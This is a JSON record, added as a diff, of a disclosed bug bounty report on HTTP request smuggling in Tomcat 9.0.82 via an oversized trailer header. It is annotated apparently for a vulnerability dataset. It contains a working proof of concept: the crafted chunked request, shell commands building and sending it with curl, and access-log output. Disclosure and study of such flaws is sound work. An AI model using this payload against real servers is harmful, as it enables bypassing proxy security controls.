@@ -1,0 +1,46 @@
+{
+    "reported_to": "Internet Bug Bounty",
+    "reported_by": "aimotonorihito ",
+    "title": "Possibility of Request smuggling attack",
+    "content": "\nRequest smuggling was possible by throwing an IOException with the upper size limit of the trailer header.\nConfirmed with tomcat version 9.0.82.\nexample\nCode 259 Bytes\n1POST /examples/test.jsp HTTP/1.1\n2Host: www.example.co.jp\n3Content-Type: application/x-www-form-urlencoded\n4Transfer-Encoding: chunked\n5Connection: KeepAlive\n6\n75\n8foo=b\n92\n10ar\n110\n12testtrailer: aaaaa...(large size)\n13a: GET /examples/?this_is_attack HTTP/1.1\n14Host: attack\n15\nReproduce with the following steps:\nCode 574 Bytes\n1$ git clone https://github.com/oss-aimoto/tomcat-trailer.git\n2$ cd tomcat-trailer\n3$ docker-compose build\n4$ docker-compose up -d\n5$ echo -n \"testtrailer: \" > 8190_EXCLUDE_COLON_SP_CR_LF.txt\n6$ for i in `seq 8179`; do echo -n \"a\"; done >> 8190_EXCLUDE_COLON_SP_CR_LF.txt\n7$ perl -e 'print \"\\r\\n\"' >> 8190_EXCLUDE_COLON_SP_CR_LF.txt\n8$ head -11 base.txt > attack5.txt\n9$ cat 8190_EXCLUDE_COLON_SP_CR_LF.txt >> attack5.txt\n10$ perl -e 'print \"a: GET /examples/?this_is_attack HTTP/1.1\\r\\nHost: attack\\r\\n\\r\\n\"' >> attack5.txt\n11$ cat attack5.txt | curl telnet://localhost:8082/ --output -\nThe result of curl is two HTTP responses(\"/examples/test.jsp\" and \"/examples/?this_is_attack\").\nTwo requests are recorded in the Tomcat access log.\nCode 186 Bytes\n1192.168.128.1 - - [23/Oct/2023:06:55:37 +0000] \"POST /examples/test.jsp HTTP/1.1\" 200 58\n2192.168.128.1 - - [23/Oct/2023:06:55:37 +0000] \"GET /examples/?this_is_attack HTTP/1.1\" 200 1126 \nImpact\nA trailer header that exceeded the header size limit could cause Tomcat to treat a single request as multiple requests leading to the possibility of request smuggling when behind a reverse proxy.\n\n",
+    "severity": [
+        7.5,
+        null
+    ],
+    "bounty": 4660,
+    "weaknesses": [
+        "HTTP Request Smuggling"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1703244120,
+    "report_url": "https://hackerone.com/reports/2280391",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Clone the tomcat-trailer repository and set up the environment using docker-compose."
+        ],
+        [
+            2,
+            "Create a large trailer header file and craft a malicious HTTP request with it."
+        ],
+        [
+            3,
+            "Send the crafted request to the Tomcat server using curl."
+        ],
+        [
+            4,
+            "Observe the server's response and check the access logs for multiple requests."
+        ]
+    ],
+    "vuln_description": "The vulnerability involves exploiting a request smuggling attack in Tomcat by sending a trailer header that exceeds the size limit, causing the server to process a single request as multiple requests. This can lead to security issues when the server is behind a reverse proxy.",
+    "reason": "The attack requires understanding of HTTP protocol intricacies, specifically chunked transfer encoding and trailer headers, as well as the specific behavior of Tomcat when processing large headers. The need to craft a precise payload and the non-obvious interaction between the header size and request processing increases the complexity.",
+    "new_complexity": "HIGH",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
